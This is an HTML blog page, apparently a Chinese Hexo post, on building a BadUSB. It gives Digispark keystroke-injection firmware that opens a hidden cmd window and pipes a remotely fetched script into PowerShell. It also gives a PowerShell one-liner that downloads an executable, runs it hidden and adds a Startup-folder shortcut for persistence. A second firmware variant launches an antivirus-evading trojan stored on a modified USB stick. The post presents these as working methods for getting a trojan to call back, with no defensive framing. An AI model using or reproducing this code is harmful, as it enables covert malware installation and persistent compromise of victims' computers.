@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="google-site-verification" content="FVeTimbT1kTEtyy7CZnjl87tv6Zu3gYnjspaqbsrZ6M" />
+    <meta name="baidu-site-verification" content="codeva-4fIoJmJzzi" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="方案一思路是通过远程下载一个ps1脚本执行，在下载免杀的木马执行。 先来看badusb的代码 1234567891011121314151617181920212223242526272829303132333435#include &quot;DigiKeyboard.h&quot;  void setup() &#123;  DigiKeyboard.sendKeyStroke(0); &#x2F;&#x2F;发">
+<meta property="og:type" content="article">
+<meta property="og:title" content="badusb制作">
+<meta property="og:url" content="https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/index.html">
+<meta property="og:site_name" content="Oceanzbz&#39;s Blog">
+<meta property="og:description" content="方案一思路是通过远程下载一个ps1脚本执行，在下载免杀的木马执行。 先来看badusb的代码 1234567891011121314151617181920212223242526272829303132333435#include &quot;DigiKeyboard.h&quot;  void setup() &#123;  DigiKeyboard.sendKeyStroke(0); &#x2F;&#x2F;发">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-05-09T16:41:30.000Z">
+<meta property="article:modified_time" content="2025-05-09T16:44:12.458Z">
+<meta property="article:author" content="Oceanzbz">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>badusb制作</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-QWTJSPQL4F');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Oceanzbz&#39;s Blog" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2025/05/11/CTF/WP/%E5%BE%A1%E7%BD%91%E6%9D%AF%E6%A0%A1%E8%B5%9Bwp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/04/09/%E5%BC%80%E5%8F%91/%E5%AE%89%E5%8D%93/Android%E5%9F%BA%E7%A1%80/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&text=badusb制作"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&is_video=false&description=badusb制作"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=badusb制作&body=Check out this article: https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&name=badusb制作&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&t=badusb制作"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%B8%80"><span class="toc-number">1.</span> <span class="toc-text">方案一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%BA%8C"><span class="toc-number">2.</span> <span class="toc-text">方案二</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        badusb制作
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Oceanzbz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-05-09T16:41:30.000Z" class="dt-published" itemprop="datePublished">2025-05-10</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="方案一"><a href="#方案一" class="headerlink" title="方案一"></a>方案一</h2><p>思路是通过远程下载一个ps1脚本执行，在下载免杀的木马执行。</p>
+<p>先来看badusb的代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">  DigiKeyboard.sendKeyStroke(<span class="number">0</span>); <span class="comment">//发送一个按键,用于清空当前的输入</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  DigiKeyboard.delay(<span class="number">500</span>);   <span class="comment">//延迟半秒钟</span></span><br><span class="line"></span><br><span class="line">  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  <span class="comment">//发送一个按键,用于打开运行对话框</span></span><br><span class="line"></span><br><span class="line">  DigiKeyboard.delay(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  DigiKeyboard.println(<span class="string">&quot;cmd /T:01 /K mode CON: COLS=16 LINES=1&quot;</span>); <span class="comment">//向运行对话框输入打开cmd</span></span><br><span class="line"></span><br><span class="line">  DigiKeyboard.sendKeyStroke(KEY_ENTER);  <span class="comment">//发送一个回车键</span></span><br><span class="line"></span><br><span class="line">  DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  DigiKeyboard.println(<span class="string">&quot;curl http://ip/1.txt | powershell&quot;</span>);  <span class="comment">//请求powershell脚本进行执行</span></span><br><span class="line"></span><br><span class="line">  DigiKeyboard.delay(<span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line">  DigiKeyboard.println(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再来看powershell脚本</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$exePath</span> = <span class="built_in">Join-Path</span> <span class="variable">$env:APPDATA</span> <span class="string">&#x27;badusbhttp.exe&#x27;</span>; (<span class="built_in">New-Object</span> System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://ip/badusbhttp.txt&#x27;</span>, <span class="variable">$exePath</span>); <span class="built_in">Start-Process</span> <span class="variable">$exePath</span> <span class="literal">-WindowStyle</span> <span class="keyword">Hidden</span>; <span class="variable">$startupPath</span> = <span class="built_in">Join-Path</span> <span class="variable">$env:APPDATA</span> <span class="string">&#x27;Microsoft\\Windows\\Start Menu\\Programs\\Startup\\badusbhttp.lnk&#x27;</span>; <span class="variable">$WshShell</span> = <span class="built_in">New-Object</span> <span class="literal">-ComObject</span> WScript.Shell; <span class="variable">$Shortcut</span> = <span class="variable">$WshShell</span>.CreateShortcut(<span class="variable">$startupPath</span>); <span class="variable">$Shortcut</span>.TargetPath = <span class="variable">$exePath</span>; <span class="variable">$Shortcut</span>.Save()</span><br></pre></td></tr></table></figure>
+
+<p>这个脚本是去下载恶意木马文件，然后执行上线，看下效果</p>
+<p>![[IMAGE20250510421127.png]]</p>
+<p>成功上线</p>
+<h2 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h2><p>通过更改硬件的方式上线，这个思路来源参考：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/A2M1QBMnffO1CpjIaXePOA">https://mp.weixin.qq.com/s/A2M1QBMnffO1CpjIaXePOA</a></p>
+<p>需要自己更改下电路板使其成为一个正常的usb和一个badusb的结合版，然后在正常的usb中放入免杀木马，在badusb中执行这个木马。</p>
+<p>badusb代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">  DigiKeyboard.sendKeyStroke(<span class="number">0</span>); <span class="comment">//发送一个按键,用于清空当前的输入</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  DigiKeyboard.delay(<span class="number">500</span>);   <span class="comment">//延迟半秒钟</span></span><br><span class="line"></span><br><span class="line">  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);  <span class="comment">//发送一个按键,用于打开运行对话框</span></span><br><span class="line"></span><br><span class="line">  DigiKeyboard.delay(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">  DigiKeyboard.println(<span class="string">&quot;cmd /T:01 /K mode CON: COLS=16 LINES=1&quot;</span>); <span class="comment">//向运行对话框输入打开cmd</span></span><br><span class="line"></span><br><span class="line">  DigiKeyboard.sendKeyStroke(KEY_ENTER);  <span class="comment">//发送一个回车键</span></span><br><span class="line"></span><br><span class="line">  DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line"></span><br><span class="line">  DigiKeyboard.println(<span class="string">&quot;D:\木马.exe&quot;</span>);  <span class="comment">//执行正常usb中存放的木马</span></span><br><span class="line"></span><br><span class="line">  DigiKeyboard.delay(<span class="number">2000</span>);</span><br><span class="line">  DigiKeyboard.println(<span class="string">&quot;E:\木马.exe&quot;</span>);  <span class="comment">//执行正常usb中存放的木马</span></span><br><span class="line">  </span><br><span class="line">  DigiKeyboard.delay(<span class="number">2000</span>);</span><br><span class="line">  DigiKeyboard.println(<span class="string">&quot;F:\木马.exe&quot;</span>);  <span class="comment">//执行正常usb中存放的木马</span></span><br><span class="line">  </span><br><span class="line">  DigiKeyboard.println(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里因为不确定我们的盘符是哪一个所以得多次尝试一下。</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/link/">Friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%B8%80"><span class="toc-number">1.</span> <span class="toc-text">方案一</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%A1%88%E4%BA%8C"><span class="toc-number">2.</span> <span class="toc-text">方案二</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&text=badusb制作"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&is_video=false&description=badusb制作"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=badusb制作&body=Check out this article: https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&title=badusb制作"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&name=badusb制作&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/05/10/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/%E5%85%8D%E6%9D%80/badusb%E5%88%B6%E4%BD%9C/&t=badusb制作"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Oceanzbz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-QWTJSPQL4F');
+</script>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
